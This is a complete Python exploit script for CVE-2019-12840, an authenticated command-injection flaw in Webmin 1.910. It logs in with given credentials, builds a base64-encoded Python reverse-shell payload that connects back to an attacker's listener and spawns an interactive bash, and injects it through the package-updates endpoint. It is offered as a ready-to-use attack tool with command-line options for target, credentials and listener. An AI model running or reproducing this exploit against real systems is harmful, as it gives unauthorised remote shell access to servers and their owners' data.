import argparse
import requests
import sys
import base64
from log_colors import *
requests.packages.urllib3.disable_warnings()

# CVE-2019-12840
# Webmin v.1.910 authenticated RCE
class CVE2019_12840:
    headers = {"User-Agent" : "Mozilla/5.0"}

    def __init__(self, url, user, passwd, lhost, lport):
        print (LogColors.BLUE + "victim: " + url  + "..." + LogColors.ENDC)
        self.url = url.rstrip("/")
        self.user, self.passwd = user, passwd
        self.lhost, self.lport = lhost, lport
        self.s = requests.Session()
        self.s.headers.update(self.headers)

    # login with creds
    def login(self):
        print (LogColors.BLUE + "login with credentials..." + LogColors.ENDC)
        params = {"page" : "", "user" : self.user, "pass" : self.passwd}
        cookies = {"testing" : "1"}
        try:
            r = self.s.post(self.url + "/session_login.cgi",
                cookies = cookies,
                params = params,
                verify = False
            )
        except Exception:
            print (LogColors.RED + "failed to login. exit :(" + LogColors.ENDC)
            sys.exit()
        else:
            if "session_login.cgi" not in r.url:
                print (LogColors.YELLOW + "successfully login..." + LogColors.ENDC)
            else:
                print (LogColors.RED + "failed to login. exit :(" + LogColors.ENDC)
                sys.exit()
    
    # prepare payload
    def prepare_payload(self):
        print (LogColors.BLUE + "prepare rev shell payload..." + LogColors.ENDC)
        payload = "python -c 'import socket,subprocess,os;"
        payload += "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        payload += "s.connect((\"{}\",{}));".format(self.lhost, self.lport)
        payload += "os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
        payload += "p=subprocess.call([\"/bin/bash\",\"-i\"]);'"
        print (LogColors.YELLOW + payload + LogColors.ENDC)
        payload_encoded = base64.b64encode(bytes(payload.encode())).decode()
        payload = 'bash -c \'echo "{}" | base64 -d | bash\''.format(payload_encoded)
        print (LogColors.YELLOW + "successfully generate payload..." + LogColors.ENDC)
        self.payload = payload

    # send payload
    def send_payload(self):
        print (LogColors.BLUE + "send payload with reverse shell..." + LogColors.ENDC)
        headers = {"Referer": self.url + "/package-updates/?xnavigation=1"}
        data = "u=&u=%20%7C%20{}&ok_top=Update+Selected+Packages".format(self.payload)
        try:
            r = self.s.post(self.url + "/package-updates/update.cgi",
                data = data, headers = headers, verify = False, timeout = 3
            )
        except:
            print (LogColors.GREEN + "successfully send payload. hacked :)" + LogColors.ENDC)

    # exploitation logic
    def exploit(self):
        self.login()
        self.prepare_payload()
        self.send_payload()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    parser.add_argument('-U','--user', required = True, help = "auth user")
    parser.add_argument('-P','--password', required = True, help = "auth password")
    parser.add_argument('-i','--ip', required = True, help = "revshell listener ip")
    parser.add_argument('-p','--port', required = True, help = "revshell listener port")
    args = vars(parser.parse_args())
    url = args['url']
    user, passwd = args['user'], args['password']
    ip, port = args['ip'], args['port']
    cve = CVE2019_12840(url, user, passwd, ip, port)
    cve.exploit()

